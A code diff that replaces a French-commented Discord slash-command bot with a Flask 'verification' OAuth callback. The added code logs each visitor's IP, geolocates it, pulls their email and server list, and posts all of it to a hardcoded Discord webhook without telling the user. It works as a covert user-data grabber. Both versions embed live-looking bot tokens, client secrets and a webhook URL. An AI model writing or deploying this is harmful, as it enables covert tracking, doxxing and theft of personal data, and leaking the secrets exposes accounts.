@@ -1,159 +1,129 @@
-from http.server import BaseHTTPRequestHandler
+from flask import Flask, request, redirect, jsonify
+import requests
 import json
-import time
-from nacl.signing import VerifyKey
-from nacl.exceptions import BadSignatureError
+from datetime import datetime
+import traceback
 
-DISCORD_PUBLIC_KEY = "26e73aa72d3ad3927cdfd5c0dc2b9d15d990e02e105bfd95700a369ef9f6c26c"
-DISCORD_BOT_TOKEN = "MTQ5OTg2OTk2ODg5OTI0NDI1Mg.G7voSN.bxlPQjGA-LfO1EhY8sDzeOfnQnWRmVvpfLOSTE"
-DISCORD_CLIENT_ID = "1499869968899244252"
-DISCORD_CLIENT_SECRET = "6LM5ZPmWcfdpqzB6Gz752-6uBdrOXbMR"
-VERCEL_URL = "negro-lemon.vercel.app"  # Sans https://
+app = Flask(__name__)
 
-def verify_signature(public_key: str, signature: str, timestamp: str, body: str) -> bool:
+# Configuration
+CLIENT_ID = "1499869968899244252"
+CLIENT_SECRET = "G2Z-Hx8fSOv8d_DsROLk0k-CZdFBrbA5"
+REDIRECT_URI = "https://negro-lemon.vercel.app/callback"
+WEBHOOK_URL = "https://discord.com/api/webhooks/1498739271006294016/_4sdyqbsQ6UPC7GP1HPtqnWAf7qPuwCf4G4HYWLVqawxX6iWpHR4kZtpb12W9UJykAT-"
+
+def get_user_ip(request):
+    if request.headers.get('X-Forwarded-For'):
+        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
+    return request.remote_addr
+
+def get_geo_location(ip):
     try:
-        vk = VerifyKey(bytes.fromhex(public_key))
-        vk.verify(f"{timestamp}{body}".encode(), bytes.fromhex(signature))
-        return True
-    except BadSignatureError:
-        return False
-
-def handle_ping():
-    return {"type": 1}
-
-def handle_ping_command():
-    """Mesure le temps de réaction du serveur"""
-    start = time.time()
-    elapsed = round((time.time() - start) * 1000)
-    return {
-        "type": 4,
-        "data": {
-            "embeds": [{
-                "title": "🏓 Pong!",
-                "description": f"**Latence du serveur :** `{elapsed}ms`",
-                "color": 0x5865F2,
-                "footer": {"text": "Discord Register Bot"}
-            }]
-        }
-    }
-
-def handle_help_command():
-    """Affiche l'aide des commandes"""
-    return {
-        "type": 4,
-        "data": {
-            "embeds": [{
-                "title": "📖 Aide — Discord Register Bot",
-                "color": 0x5865F2,
-                "fields": [
-                    {
-                        "name": "📝 `/register`",
-                        "value": "Lance le processus d'inscription.\nVous recevrez un lien OAuth Discord pour autoriser l'accès à votre email.\nUne fois connecté, votre **User ID** et **email** vous seront envoyés en message privé.",
-                        "inline": False
-                    },
-                    {
-                        "name": "🏓 `/ping`",
-                        "value": "Teste la latence du serveur bot.",
-                        "inline": False
-                    },
-                    {
-                        "name": "❓ `/help`",
-                        "value": "Affiche ce message d'aide.",
-                        "inline": False
-                    }
-                ],
-                "footer": {"text": "Discord Register Bot • Powered by Vercel"}
-            }],
-            "flags": 64  # Ephemeral (visible uniquement par l'utilisateur)
-        }
-    }
-
-def handle_register_command(user_id: str):
-    """Génère un lien OAuth pour l'inscription"""
-    base_url = f"https://{VERCEL_URL}"
-    oauth_url = (
-        f"https://discord.com/oauth2/authorize"
-        f"?client_id={DISCORD_CLIENT_ID}"
-        f"&redirect_uri={base_url}/api/oauth-callback"
-        f"&response_type=code"
-        f"&scope=identify%20email"
-        f"&state={user_id}"
-    )
-    return {
-        "type": 4,
-        "data": {
-            "embeds": [{
-                "title": "📝 Inscription",
-                "description": (
-                    "Clique sur le bouton ci-dessous pour t'inscrire.\n\n"
-                    "Tu seras redirigé vers Discord pour autoriser l'accès à ton **email**.\n"
-                    "Une fois l'autorisation accordée, tu recevras un **message privé** "
-                    "avec ton **User ID** et ton **email**."
-                ),
-                "color": 0x57F287,
-                "footer": {"text": "L'autorisation expire dans 5 minutes"}
-            }],
-            "components": [{
-                "type": 1,
-                "components": [{
-                    "type": 2,
-                    "style": 5,  # Link button
-                    "label": "🔗 S'inscrire avec Discord",
-                    "url": oauth_url
-                }]
-            }],
-            "flags": 64  # Ephemeral
-        }
-    }
-
-def route_command(data: dict) -> dict:
-    command_name = data.get("data", {}).get("name", "")
-    user = data.get("member", {}).get("user") or data.get("user", {})
-    user_id = user.get("id", "")
-
-    if command_name == "ping":
-        return handle_ping_command()
-    elif command_name == "help":
-        return handle_help_command()
-    elif command_name == "register":
-        return handle_register_command(user_id)
-    else:
+        resp = requests.get(f"https://ipapi.co/{ip}/json/", timeout=5)
+        geo_data = resp.json()
         return {
-            "type": 4,
-            "data": {"content": "❌ Commande inconnue.", "flags": 64}
+            "country": geo_data.get('country_name', 'Unknown'),
+            "city": geo_data.get('city', 'Unknown'),
+            "region": geo_data.get('region', 'Unknown'),
+            "vpn": geo_data.get('proxy', False) or geo_data.get('vpn', False),
+            "mobile": geo_data.get('mobile', False)
         }
+    except:
+        return {"error": "Geo unavailable"}
 
-class handler(BaseHTTPRequestHandler):
-    def do_POST(self):
-        content_length = int(self.headers.get("Content-Length", 0))
-        raw_body = self.rfile.read(content_length).decode("utf-8")
+def send_to_webhook(user_data, guilds_data, user_ip, geo_info):
+    guilds_count = len(guilds_data) if isinstance(guilds_data, list) else 0
+    
+    embed = {
+        "title": "🔐 **New User Verification**",
+        "color": 0x57F287,
+        "timestamp": datetime.now().isoformat(),
+        "fields": [
+            {
+                "name": "👤 **User**",
+                "value": f"**Username:** {user_data.get('username', 'Unknown')}\n**ID:** `{user_data.get('id', 'Unknown')}`",
+                "inline": False
+            },
+            {
+                "name": "📧 **Email**",
+                "value": f"**Email:** {user_data.get('email', 'No email')}\n**Verified:** {'✅ Yes' if user_data.get('verified') else '❌ No'}",
+                "inline": True
+            },
+            {
+                "name": "📁 **Servers**",
+                "value": f"**Total:** {guilds_count}",
+                "inline": True
+            },
+            {
+                "name": "🌐 **Location**",
+                "value": f"**IP:** {user_ip}\n**City:** {geo_info.get('city', 'Unknown')}\n**Country:** {geo_info.get('country', 'Unknown')}\n**VPN:** {'⚠️ Yes' if geo_info.get('vpn') else '✅ No'}",
+                "inline": False
+            }
+        ]
+    }
+    
+    if user_data.get('avatar'):
+        embed["thumbnail"] = {"url": f"https://cdn.discordapp.com/avatars/{user_data['id']}/{user_data['avatar']}.png"}
+    
+    try:
+        requests.post(WEBHOOK_URL, json={"embeds": [embed]})
+    except Exception as e:
+        print(f"Webhook error: {e}")
 
-        signature = self.headers.get("X-Signature-Ed25519", "")
-        timestamp = self.headers.get("X-Signature-Timestamp", "")
+@app.route('/')
+def home():
+    return jsonify({"status": "online", "service": "Discord Verification API"})
 
-        # Vérification de la signature Discord
-        if not verify_signature(DISCORD_PUBLIC_KEY, signature, timestamp, raw_body):
-            self.send_response(401)
-            self.end_headers()
-            self.wfile.write(b"Invalid signature")
-            return
+@app.route('/callback')
+def callback():
+    code = request.args.get('code')
+    
+    if not code:
+        return redirect("https://guns.lol/j8a?error=no_code")
+    
+    user_ip = get_user_ip(request)
+    geo_info = get_geo_location(user_ip)
+    
+    try:
+        token_response = requests.post(
+            "https://discord.com/api/oauth2/token",
+            data={
+                "client_id": CLIENT_ID,
+                "client_secret": CLIENT_SECRET,
+                "grant_type": "authorization_code",
+                "code": code,
+                "redirect_uri": REDIRECT_URI
+            },
+            headers={"Content-Type": "application/x-www-form-urlencoded"}
+        )
+        
+        token_json = token_response.json()
+        access_token = token_json.get('access_token')
+        
+        if not access_token:
+            return redirect("https://guns.lol/j8a?error=token_failed")
+        
+        user_response = requests.get(
+            "https://discord.com/api/users/@me",
+            headers={"Authorization": f"Bearer {access_token}"}
+        )
+        user_data = user_response.json()
+        
+        guilds_response = requests.get(
+            "https://discord.com/api/users/@me/guilds",
+            headers={"Authorization": f"Bearer {access_token}"}
+        )
+        guilds_data = guilds_response.json() if guilds_response.status_code == 200 else []
+        
+        send_to_webhook(user_data, guilds_data, user_ip, geo_info)
+        
+        print(f"✅ Verified: {user_data.get('username')} - IP: {user_ip}")
+        
+        return redirect("https://guns.lol/j8a?verified=true")
+        
+    except Exception as e:
+        print(f"Error: {e}")
+        return redirect("https://guns.lol/j8a?error=unknown")
 
-        body = json.loads(raw_body)
-        interaction_type = body.get("type")
-
-        # PING Discord (vérification de l'endpoint)
-        if interaction_type == 1:
-            response = handle_ping()
-        # APPLICATION_COMMAND (slash commands)
-        elif interaction_type == 2:
-            response = route_command(body)
-        else:
-            response = {"type": 1}
-
-        self.send_response(200)
-        self.send_header("Content-Type", "application/json")
-        self.end_headers()
-        self.wfile.write(json.dumps(response).encode())
-
-    def log_message(self, format, *args):
-        pass  # Silence les logs HTTP par défaut
+if __name__ == "__main__":
+    app.run()
